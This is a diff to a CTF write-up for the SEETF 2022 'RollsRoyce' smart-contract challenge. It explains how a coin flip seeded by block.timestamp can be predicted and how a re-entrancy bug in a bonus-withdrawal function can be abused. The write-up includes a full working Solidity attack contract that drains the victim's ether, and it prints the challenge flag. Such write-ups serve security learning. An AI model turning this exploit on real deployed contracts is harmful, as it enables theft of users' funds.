@@ -1,6 +1,7 @@
 # RollsRoyce
 
-This was a smart-contract challenge that was part of the recent [SEETF 2022](https://ctftime.org/event/1543/) hosted by the [Social Engineering Experts](https://seetf.sg/seetf/).
+This was a smart-contract challenge that was part of the recent [SEETF 2022](https://ctftime.org/event/1543/) hosted by the [Social Engineering Experts](https://seetf.sg/seetf/). I played this together under [3_Blind_Mice](https://ctftime.org/team/190705), a random team made together with [@chuayupeng](https://github.com/chuayupeng) and [ethon](https://github.com/gnosis-agora) for pure fun and memes.
+
 Solving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on `block.timestamp` being used as a random generator, and a [re-entrancy attack](https://hackernoon.com/hack-solidity-reentrancy-attack). 
 
 We are given this `RollsRoyce.sol` contract as shown below:
@@ -176,4 +177,159 @@ Essentially, the `win()` function basically tries to call `guess()` and `revealR
 
 We can then deploy this `Attack` contract and transfer some ether to it. We can verify that our `win()` function is indeed working as intended by calling the function multiple times and verifying against the `viewWins()` function in the deployed RollsRoyce contract as shown below
 
-<RollsRoyce Win Image>
+![image](https://user-images.githubusercontent.com/33711159/172994068-ec4c683c-64df-4d5f-89c4-19c772dbc399.png)
+
+Great! We have a surefireway to win the coin flips now by exploiting the usage of a predictable `block.timestamp`!
+
+## Exploit 2 - Re-entrancy Attack
+
+A classic attack when it comes to exploiting smart contracts - a re-entrancy attack in short basically exploits the idea of a victim contract blindly makes an external call to a malicious contract. In this challenge, the re-entrancy attack was exploitable through the `withdrawFirstWinPrizeMoneyBonus()` function as shown below:
+```solidity
+function withdrawFirstWinPrizeMoneyBonus() external {
+    require(
+        !claimedPrizeMoney[msg.sender],
+        "You have already claimed the first win bonus"
+    );
+    playerPool[msg.sender] += 1 ether;
+    withdrawPrizeMoney(msg.sender);
+    claimedPrizeMoney[msg.sender] = true;
+}
+```
+When a player calls the `withdrawFirstWinPrizeMoneyBonus()` after winning the game, the contract will essentially add an additional 1 ether to the player's prize pool via `playerPool[msg.sender] += 1 ether`. The thing is, this function can only be called once by the player as seen in the first statement `require(!claimedPrizeMoney[msg.sender]`. `claimedPrizeMoney[msg.sender]` gets set to `true` at the end of the function in the last line, after `withdrawPrizeMoney()`.
+
+Now let's look at what `withdrawPrizeMoney()` does:
+```solidity
+function sendValue(address payable recipient, uint256 amount) internal {
+    require(
+        address(this).balance >= amount,
+        "Address: insufficient balance"
+    );
+
+    (bool success, ) = recipient.call{value: amount}("");
+}
+
+function withdrawPrizeMoney(address _to) public payable {
+    require(
+        msg.sender == _to,
+        "Only the player can withdraw the prize money"
+    );
+    require(
+        playerConsecutiveWins[_to] >= 3,
+        "You need to win 3 or more consecutive games to claim the prize money"
+    );
+
+    if (playerConsecutiveWins[_to] >= 3) {
+        uint256 prizeMoney = playerPool[_to];
+        playerPool[_to] = 0;
+        sendValue(payable(_to), prizeMoney);
+    }
+}
+```
+Essentially, `withdrawPrizeMoney()` simply sends the player calling the function the amount of ether as stored in `playerPool[recipient]`, after checking that the player has won at least 3 or more times consecutively. 
+
+So where is the vulnerability and how can it be exploited? 
+
+When a contract sends another address some ether like seen in the `sendValue(address payable recipient, uint256 amount)` function, the contract is actually making a call to the victim's [receive()](https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function) function. In essence, we can implement the `receive()` function in a way such that it makes a recursive call back to a victim contract's exploitable function.
+
+In this case, the exploitable function is the `withdrawFirstWinPrizeMoneyBonus()`. Lets take a look at the function calls being made when a player calls the `withdrawFirstWinPrizeMoneyBonus()` function (or at least what's important to take note of):
+- `withdrawFirstWinPrizeMoneyBonus()` --> 
+    - `require(!claimedPrizeMoney[msg.sender]) -->
+    - `playerPool[msg.sender] += 1 ether;` --> 
+    - `withdrawPrizeMoney(msg.sender);` --> 
+        - `sendValue(payable(_to), prizeMoney);` --> 
+    - `claimedPrizeMoney[msg.sender] = true;`
+
+
+If we can somehow re-make the call to the `withdrawFirstWinPrizeMoneyBonus()` function before `claimedPrizeMoney[msg.sender]` gets set to `true`, we can essentially keep recursively calling that function until the contract has no funds, which is the aim of this challenge ultimately. In other words, we want to make a function call back to the `withdrawFirstWinPrizeMoneyBonus()` function right after receiving ether from the victim contract, something like below:
+- `withdrawFirstWinPrizeMoneyBonus()` --> 
+    - `require(!claimedPrizeMoney[msg.sender])` -->
+    - `playerPool[msg.sender] += 1 ether;` --> 
+    - `withdrawPrizeMoney(msg.sender);` --> 
+        - `sendValue(payable(_to), prizeMoney);` --> 
+            - `withdrawFirstWinPrizeMoneyBonus()` --> 
+                - `require(!claimedPrizeMoney[msg.sender])` -->
+                - `playerPool[msg.sender] += 1 ether;` --> 
+                - `withdrawPrizeMoney(msg.sender);` --> 
+                    - `sendValue(payable(_to), prizeMoney);` --> 
+                        - .......
+    - `claimedPrizeMoney[msg.sender] = true;`
+
+We can achieve this by simply extending our `Attack` contract and implementing our own malicious `receive()` function as shown below:
+```solidity
+receive() external payable {
+    if (victim.viewWins(address(this)) >= 3 && address(victim).balance > 0) {
+        victim.withdrawFirstWinPrizeMoneyBonus();
+    }
+}
+```
+
+Note that we also want to check that we only trigger the vulnerable re-entrancy function if we have already won the game, and we only wish to keep drawing the funds if there are even funds to draw.
+
+## Putting it all together
+Alright, now that we understand what we need to do, let's implement the full contract!
+
+```solidity
+contract Attack {
+    RollsRoyce victim;
+    address owner;
+
+    constructor(address payable _addr) public payable {
+        owner = msg.sender;
+        victim = RollsRoyce(_addr);
+    }
+
+    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
+        return
+            RollsRoyce.CoinFlipOption(
+                uint(
+                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
+                ) % 2
+            );
+    }
+
+    function win() public payable {
+        require(address(this).balance >= 1 ether, "Send contract some ether");
+        RollsRoyce.CoinFlipOption result = flipCoin();
+        victim.guess{value: 1 ether}(result);
+        victim.revealResults();
+    }
+
+    function pwnContract() public payable {
+        for (uint i = 0; i < 3; i++) {
+            win();
+        }
+        victim.withdrawFirstWinPrizeMoneyBonus();
+    }
+
+    receive() external payable {
+        if (victim.viewWins(address(this)) >= 3 && address(victim).balance > 0) {
+            victim.withdrawFirstWinPrizeMoneyBonus();
+        }
+    }
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    function withdrawBalance(uint amount) public {
+        require(msg.sender == owner, "You not owner!");
+        require(address(this).balance >= amount, "This contract has no more funds!");
+        (bool success, ) = msg.sender.call{value: amount}("");
+    }
+}
+```
+
+For simplicity, everything can be done from within a single function call `pwnContract()` itself, which includes winning the coin flip 3 times consecutively, and also making the call to the exploitable `withdrawFirstWinPrizeMoneyBonus()` function. We simply just have to call the `pwnContract()` function, transfer 3 ether to it and then, we'd solve the challenge.
+
+To also make things more realistic, we can also implement a `withdrawBalance()` function to withdraw funds from the contract (otherwise the funds are simply stuck in the contract and lost forever once deployed!)
+
+Once we call `pwnContract()`, we can see that challenge has been solved and isSolved() has been set to true!
+
+![image](https://user-images.githubusercontent.com/33711159/173044701-0a860127-b0f7-436e-9191-da44ab4f23f2.png)
+
+Now let's go grab our flag :)
+
+![image](https://user-images.githubusercontent.com/33711159/173044866-3814bcf0-144b-44a3-adcd-98cb18aca9cd.png)
+`SEE{R4nd0m_R0yC3_6390bc0863295e58c2922f4fca50dab9}`
+
+
